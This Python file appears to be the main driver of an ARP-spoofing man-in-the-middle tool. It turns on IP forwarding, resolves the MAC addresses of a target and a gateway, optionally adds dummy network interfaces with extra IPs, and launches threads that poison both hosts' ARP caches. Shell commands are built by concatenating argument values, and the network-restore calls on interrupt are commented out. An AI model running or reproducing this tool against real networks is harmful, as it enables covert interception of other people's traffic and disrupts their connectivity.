import os
import funcs
import spoofer
import _thread


def menu():
    funcs.cls()

    print(f"""
    {bcolors.OKGREEN}
          _/_/_/  _/_/_/        _/    _/            _/           
           _/    _/    _/      _/    _/    _/_/    _/    _/_/    
          _/    _/_/_/        _/_/_/_/  _/    _/  _/  _/_/_/_/   
         _/    _/            _/    _/  _/    _/  _/  _/          
      _/_/_/  _/            _/    _/    _/_/    _/    _/_/_/
    
    {bcolors.ENDC}
    """)
    return



def switch():
    return


def startup(t):
    if "nt" in os.name:
        print(bcolors.FAIL + "Can only run on a unix system" + bcolors.ENDC)
        exit()

    print("----------------------------------")
    targets = funcs.argParser()
    print("----------------------------------")
    print("Enabling ip forward")
    print("----------------------------------")
    t.toggleIpforward()
    print("Getting mac address for " + targets[0])
    target_mac = spoofer.get_mac(targets[0])
    print(bcolors.OKGREEN + "Success " + target_mac + bcolors.ENDC)
    print("Getting mac address for " + targets[1])
    gw_mac = spoofer.get_mac(targets[1])
    print(bcolors.OKGREEN + "Success " + gw_mac + bcolors.ENDC)
    print("----------------------------------")

    if targets[2]:
        i = 0
        print("Creating Virtual NIC eth10 with ips: ", targets[2])
        bash = "modprobe dummy && ip link add dummy type dummy"
        os.system(bash)
        for x in targets[2]:
            bash = "ip addr add " + x + "/0 dev dummy label dummy:" + str(i)
            os.system(bash)
            i = i + 1
        bash = "ip a | grep -w inet"
        os.system(bash)
        print("Dummy NICs created")
        print("----------------------------------")

    print("Starting ARP spoofer thread...")

    _thread.start_new_thread(spoofer.thread_spoof, (targets[0], targets[1], target_mac))
    _thread.start_new_thread(spoofer.thread_spoof, (targets[1], targets[0], gw_mac))

    print("Success!")
    print("----------------------------------")

    return


def interrupt():
    print("[!] Detected CTRL+C ! restoring the network, please wait...")
    bash = "ip link delete dummy type dummy"
    os.system(bash)
    #spoofer.restore(targets[0], targets[1], target_mac, gw_mac)
    #spoofer.restore(targets[1], targets[0], target_mac, gw_mac)
    print("Done")
    print("----------------------------------")
    exit()


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'